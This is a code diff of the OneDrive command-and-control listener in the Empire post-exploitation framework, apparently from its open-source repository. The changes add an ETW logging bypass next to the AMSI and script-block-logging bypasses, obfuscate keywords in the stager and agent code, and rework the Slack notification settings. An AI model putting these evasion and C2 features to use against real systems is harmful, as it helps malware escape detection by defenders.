@@ -1,26 +1,23 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
+
 import base64
-import random
+import copy
+import json
 import os
 import re
 import time
-from datetime import datetime
-import copy
 import traceback
-import sys
-import json
+from builtins import object
+from builtins import str
+from datetime import datetime
+
 from pydispatch import dispatcher
 from requests import Request, Session
 
+from lib.common import bypasses
+from lib.common import encryption
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
-from lib.common import packets
-from lib.common import messages
-from lib.common import bypasses
 
 
 class Listener(object):
@@ -130,15 +127,10 @@ class Listener(object):
                 'Required': True,
                 'Value': "https://login.live.com/oauth20_desktop.srf"
             },
-            'SlackToken': {
-                'Description': 'Your SlackBot API token to communicate with your Slack instance.',
+            'SlackURL': {
+                'Description': 'Your Slack Incoming Webhook URL to communicate with your Slack instance.',
                 'Required': False,
                 'Value': ''
-            },
-            'SlackChannel': {
-                'Description': 'The Slack channel or DM that notifications will be sent to.',
-                'Required': False,
-                'Value': '#general'
             }
         }
 
@@ -178,7 +170,7 @@ class Listener(object):
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
                           proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
-                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
+                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
         if not language:
             print(helpers.color("[!] listeners/onedrive generate_launcher(): No language specified"))
 
@@ -203,6 +195,8 @@ class Listener(object):
                     # ScriptBlock Logging bypass
                     if scriptLogBypass:
                         launcher += bypasses.scriptBlockLogBypass()
+                    if ETWBypass:
+                        launcher += bypasses.ETWBypass()
                     # @mattifestation's AMSI bypass
                     if AMSIBypass:
                         launcher += bypasses.AMSIBypass()
@@ -296,6 +290,8 @@ class Listener(object):
             f = open("%s/data/agent/stagers/onedrive.ps1" % self.mainMenu.installPath)
             stager = f.read()
             f.close()
+            # Get the random function name generated at install and patch the stager with the proper function name
+            stager = helpers.keyword_obfuscation(stager)
 
             stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
             stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
@@ -469,6 +465,9 @@ class Listener(object):
             agent_code = f.read()
             f.close()
 
+
+            agent_code = helpers.keyword_obfuscation(agent_code)
+
             comms_code = self.generate_comms(listener_options, client_id, client_secret, token, refresh_token,
                                              redirect_uri, language)
             agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
@@ -632,7 +631,12 @@ class Listener(object):
             })
             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
         else:
-            token = get_token(client_id, client_secret, auth_code)
+            try:
+                token = get_token(client_id, client_secret, auth_code)
+            except:
+                print(helpers.color("[!] Unable to retrieve OneDrive Token"))
+                return
+
             message = "[*] Got new auth token"
             signal = json.dumps({
                 'print': True,
@@ -803,12 +807,7 @@ class Listener(object):
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
                             continue
 
-                        try:  # Update the agent's last seen time, from the file timestamp
-                            seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%S.%fZ")
-                        except:  # sometimes no ms for some reason...
-                            seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%SZ")
-                        seen_time = helpers.utc_to_local(seen_time)
-                        self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)
+                        self.mainMenu.agents.update_agent_lastseen_db(agent_id)
 
                         # If the agent is just checking in, the file will only be 1 byte, so no results to fetch
                         if (item['size'] > 1):
